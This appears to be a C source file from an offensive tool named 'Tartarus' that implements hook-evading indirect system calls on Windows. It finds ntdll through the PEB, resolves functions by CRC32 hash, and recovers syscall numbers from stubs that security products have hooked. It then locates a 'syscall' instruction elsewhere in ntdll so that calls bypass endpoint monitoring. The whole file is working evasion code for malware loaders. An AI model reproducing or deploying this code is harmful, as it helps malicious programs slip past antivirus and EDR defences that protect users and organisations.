#include "Tartarus.h"
#include <stdio.h>

NTDLL_CONFIG g_NtdllConf = { 0 };

// Simple CRC32 Hash implementation for "HASH(pcFuncName)"
DWORD CRC32B(LPCSTR string) {
    DWORD mask = 0;
    DWORD state = 0xFFFFFFFF;
    unsigned int byte;
    while ((byte = *string++) != 0) {
        state = state ^ byte;
        for (int j = 0; j < 8; j++) {
            mask = -(int)(state & 1);
            state = (state >> 1) ^ (0xEDB88320 & mask);
        }
    }
    return ~state;
}

#define HASH(x) CRC32B(x)

BOOL InitNtdllConfigStructure() {
    // Getting PEB
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || !pPeb->Ldr) return FALSE;

    // Getting ntdll.dll base address
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->InLoadOrderModuleList.Flink;
    while (pDte->DllBase != NULL) {
        // Simple check for "ntdll.dll" (Length check usually sufficient for basic logic)
        // In prod: use case-insensitive string compare
        if (pDte->BaseDllName.Length == 18) { // L"ntdll.dll" length * 2
            g_NtdllConf.uModule = pDte->DllBase;
            break;
        }
        pDte = (PLDR_DATA_TABLE_ENTRY)pDte->InLoadOrderLinks.Flink;
    }

    if (!g_NtdllConf.uModule) return FALSE;

    // Parsing Exports
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)g_NtdllConf.uModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)g_NtdllConf.uModule + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)g_NtdllConf.uModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    g_NtdllConf.dwNumberOfNames = pExport->NumberOfNames;
    g_NtdllConf.pdwArrayOfNames = (PDWORD)((ULONG_PTR)g_NtdllConf.uModule + pExport->AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)((ULONG_PTR)g_NtdllConf.uModule + pExport->AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals = (PWORD)((ULONG_PTR)g_NtdllConf.uModule + pExport->AddressOfNameOrdinals);

    return TRUE;
}

BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != 0)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName = (PCHAR)((ULONG_PTR)g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)((ULONG_PTR)g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            pNtSys->pSyscallAddress = pFuncAddress;

            // Scenario 0: Not hooked
            if (*((PBYTE)pFuncAddress) == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSn = (high << 8) | low;
                // break; // moved below to continue search for ret gadget if needed, but normally break is fine
            }

            // if hooked - scenario 1 (Direct JMP)
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = ((high << 8) | low) - idx;
                        break;
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = ((high << 8) | low) + idx;
                        break;
                    }
                }
            }

            // if hooked - scenario 2 (JMP inside)
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = ((high << 8) | low) - idx;
                        break;
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = ((high << 8) | low) + idx;
                        break;
                    }
                }
            }
            break;
        }
    }

    if (!pNtSys->pSyscallAddress)
        return FALSE;

    // --- HELLHALL PART: FIND 'syscall; ret' ---
    // looking somewhere random (0xFF byte away from the syscall address)
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

    // getting the 'syscall' instruction of another syscall function
    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x & z]
        }
    }

    // Check results
    if (pNtSys->dwSSn != 0 && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != 0 && pNtSys->pSyscallInstAddress != NULL)
        return TRUE;
    else
        return FALSE;
}